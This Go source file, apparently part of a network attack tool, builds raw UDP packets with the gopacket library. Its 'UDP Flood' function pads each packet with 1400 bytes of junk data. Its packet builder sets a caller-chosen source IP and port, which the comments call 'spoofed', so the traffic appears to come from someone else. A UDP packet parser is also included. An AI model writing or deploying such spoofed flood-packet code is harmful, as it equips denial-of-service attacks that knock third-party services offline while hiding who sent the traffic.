package protocol

import (
	"errors"
	"fmt"
	"net"
	"strings"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// UDP Flood
func UDPPacket(srcip, dstip string, srcport, dstport int) ([]byte, error) {
	var payloadstr string = strings.Repeat("T", 1400) // Application layer data
	payload := []byte(payloadstr)

	return BuildUDPPacket(srcip, dstip, srcport, dstport, payload)
}

func BuildUDPPacket(srcIP, dstIP string, srcPort, dstPort int, payload []byte) ([]byte, error) {
	dstMacStr, err := FindMAC(dstIP)
	if err != nil {
		return nil, fmt.Errorf("failed to find MAC for %s: %w", dstIP, err)
	}
	dstMac, err := net.ParseMAC(dstMacStr)
	if err != nil {
		return nil, fmt.Errorf("failed to parse MAC address: %w", err)
	}

	srcMac, err := GetSrcMAC(dstIP)
	if err != nil {
		return nil, fmt.Errorf("failed to get source MAC address: %w", err)
	}

	// Construct Ethernet layer
	ethLayer := &layers.Ethernet{
		SrcMAC:       srcMac, // Source MAC address
		DstMAC:       dstMac, // Next-hop MAC address
		EthernetType: layers.EthernetTypeIPv4,
	}

	// Construct IP layer
	ipLayer := &layers.IPv4{
		Version:    4,                    // Explicitly set IPv4 version
		IHL:        5,                    // Internet Header Length (usually 5)
		TOS:        0,                    // Type of Service
		Length:     0,                    // Total length, automatically calculated during serialization
		Id:         0,                    // Packet ID
		Flags:      0,                    // Flags
		FragOffset: 0,                    // Fragment offset
		TTL:        64,                   // Time to Live
		Protocol:   layers.IPProtocolUDP, // Protocol type
		SrcIP:      net.ParseIP(srcIP),   // Spoofed source IP
		DstIP:      net.ParseIP(dstIP),   // Destination IP
	}

	// Construct UDP layer
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(srcPort), // Spoofed source port
		DstPort: layers.UDPPort(dstPort), // Destination port
	}

	// Set network layer to calculate checksum
	if err := udpLayer.SetNetworkLayerForChecksum(ipLayer); err != nil {
		return nil, fmt.Errorf("failed to calculate UDP checksum: %v", err)
	}

	// Create serialization options to set length and checksum
	options := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	buffer := gopacket.NewSerializeBuffer()

	// Serialize Ethernet layer, IP layer, UDP layer, and payload
	err = gopacket.SerializeLayers(buffer, options, ethLayer, ipLayer, udpLayer, gopacket.Payload(payload))
	if err != nil {
		return nil, fmt.Errorf("failed to serialize layers: %v", err)
	}

	// Return the generated packet as a byte slice
	return buffer.Bytes(), nil
}

// Parse UDP packet and return application layer data
func ResolveUDPPacket(packet []byte) (srcPort, dstPort int, payload []byte, err error) {
	// Use gopacket to parse the packet, assuming parsing starts from the UDP layer
	parser := gopacket.NewPacket(packet, layers.LayerTypeUDP, gopacket.Default)

	// Extract UDP layer
	udpLayer := parser.Layer(layers.LayerTypeUDP)
	if udpLayer == nil {
		return 0, 0, nil, errors.New("failed to parse UDP layer")
	}
	udp, _ := udpLayer.(*layers.UDP)
	srcPort = int(udp.SrcPort)
	dstPort = int(udp.DstPort)
	payload = udp.Payload

	return srcPort, dstPort, payload, nil
}
